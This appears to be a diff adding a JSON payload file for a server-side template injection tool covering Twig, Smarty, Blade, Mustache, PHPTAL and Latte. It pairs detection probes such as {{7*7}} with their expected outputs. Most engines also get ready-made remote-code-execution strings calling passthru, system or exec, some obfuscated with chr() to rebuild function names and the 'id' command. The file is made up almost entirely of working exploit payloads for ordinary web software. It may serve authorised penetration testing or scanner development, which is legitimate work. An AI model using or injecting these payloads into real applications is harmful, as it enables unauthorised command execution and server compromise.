@@ -1,0 +1,63 @@
+{
+  "twig_php": {
+    "payloads": {
+      "{{7*7}}" :"49",
+      "{{ \"yes\"|upper }}" : "YES",
+      "{{7*'7'}}" :"49"
+    },
+    "exploit": {
+      "rce": "{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}"
+    }
+  },
+  "smarty": {
+    "payloads": {
+      "{{7*7}}" :"49",
+      "{math equation=\"7*7\"}":"49",
+      "{if 1<2}OK{/if}":"OK"
+    },
+    "exploit": {
+      "rce": "{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}",
+      "rce_cms": "{block name=\"*/system('id');//\"}{/block}",
+      "rce_cms2": "{php}echo system(\"ls\");{/php}"
+
+    }
+  },
+  "blade": {
+    "payloads": {
+      "<?=7*7?>": "49",
+      "{{7*7}}" :"49",
+      "f{{--X--}}oo":"foo"
+    },
+    "exploit": {
+      "rce": "{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}"
+    }
+  },
+  "mustache": {
+    "payloads": {
+      "f{{--X--}}oo":"foo",
+      "{{^a}}yes{{/a}}":"yes"
+    },
+    "exploit": {
+    }
+  },
+  "phptal": {
+    "payloads": {
+      "<tal:block tal:define=\"x php:7*7\">${x}</tal:block>":"49"
+    },
+    "exploit": {
+      "rce": "<tal:block tal:content=\"php:exec('id')\" ></tal:block>"
+    }
+  },
+  "latte": {
+    "payloads": {
+      "{=7*7}":"49",
+      "{if 1<2}OK{/if}": "OK",
+      "{='yes'|upper}": "YES",
+      "{{7*7}}" : "{49}"
+    },
+    "exploit": {
+      "rce": "{=system('id')}"
+    }
+  }
+}
+
